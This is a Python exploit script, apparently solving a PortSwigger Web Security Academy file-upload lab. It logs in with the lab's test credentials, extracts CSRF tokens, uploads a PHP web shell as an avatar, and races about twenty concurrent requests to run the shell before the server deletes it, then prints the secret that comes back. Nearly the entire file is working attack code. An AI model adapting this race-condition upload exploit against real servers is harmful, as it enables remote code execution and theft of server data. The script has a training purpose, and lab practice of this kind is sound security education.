import requests
import re
import sys
from bs4 import BeautifulSoup
import concurrent.futures
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_scookie_and_ctoken(url):
    uri = "/login"
    r = requests.get(url + uri, verify=False, proxies=proxies)
    session_cookie = r.cookies.get_dict()['session']
    soup = BeautifulSoup(r.text, "html.parser")
    s = soup.findAll("input")
    csrf_token = re.search(r"[A-Z,a-z,0-9]{32}", str(s))
    return session_cookie,csrf_token.group(0)


def get_authorized_scookie(url, session_cookie, csrf_token):
    uri = "/login"
    cookies = {'session' : session_cookie}
    params = {'csrf' : csrf_token, 'username' : 'wiener', 'password' : 'peter'}
    r = requests.post(url + uri, cookies=cookies, data=params, allow_redirects=False, verify=False, proxies=proxies)
    authorized_session_cookie = r.cookies.get_dict()['session']
    return authorized_session_cookie


def get_csrf_token(url, authorized_session_cookie):
    uri = "/my-account"
    cookies = {'session' : authorized_session_cookie}
    r = requests.get(url + uri, cookies=cookies, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    s = soup.findAll("input")
    csrf_token = re.search(r"[A-Z,a-z,0-9]{32}", str(s))
    return csrf_token.group(0)

def retrieve_file(url):
    retrieve_path = "/files/avatars/shell-lab01.php"
    r = requests.get(url + retrieve_path, verify=False, proxies=proxies)
    return r

def upload_and_retrieve(url, authorized_session_cookie, csrf_token): # FAST ENOUGH
    upload_path = "/my-account/avatar"
    cookies = {'session' : authorized_session_cookie}
    params = {'csrf' : csrf_token, 'user' : 'wiener'}
    files = {'avatar' : open(r"C:\Users\acalarco\csec\web-pentest\portswigger-academy\file-upload\shell-lab01.php", "rb")}
    with concurrent.futures.ThreadPoolExecutor() as executor:
        get_request = []
        for i in range(1,20):
            get_request.append(executor.submit(retrieve_file, url=url))
            if i == 10:
                requests.post(url + upload_path, cookies=cookies, data=params, files=files, verify=False, proxies=proxies)
            i += 1
        for request in concurrent.futures.as_completed(get_request):
            response = request.result()
            if response.status_code == 200:
                return response.text
                


def post_and_get(url, authorized_session_cookie, csrf_token):    # NOT FAST ENOUGH
    upload_path = "/my-account/avatar"
    cookies = {'session' : authorized_session_cookie}
    params = {'csrf' : csrf_token, 'user' : 'wiener'}
    files = {'avatar' : open(r"C:\Users\acalarco\csec\web-pentest\portswigger-academy\file-upload\shell-lab01.php", "rb")}

    retrieve_path = "/files/avatars/shell-lab01.php"
    requests.post(url + upload_path, cookies=cookies, data=params, files=files, verify=False, proxies=proxies)
    r = requests.get(url + retrieve_path, verify=False, proxies=proxies)
    print(r.status_code)


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Testing for an upload vulnerability in the upload function available to logged-in users.")
    print("[+] The vulnerability can be exploited in a Race Condition Attack: the server takes a short window of time before deleting invalid files.")
    print("[+] In that window of time it is possible to access the invalid file and have it executed by the server.\n")

    print("[+] Logging to the website as user wiener...")
    session_cookie,csrf_token = get_scookie_and_ctoken(url)
    authorized_session_cookie = get_authorized_scookie(url, session_cookie, csrf_token)
    print("[+] Login complete!\n")

    print("[+] Uploading now the php shell and firing something like 100 requests against the remote server... let's see if we can execute the file before it is deleted...")
    csrf_token = get_csrf_token(url, authorized_session_cookie)
    secret = upload_and_retrieve(url, authorized_session_cookie, csrf_token)
    #post_and_get(url, authorized_session_cookie, csrf_token)
    print("[+] We did it! The secret code is %s" % secret)


if __name__ == "__main__":
    main()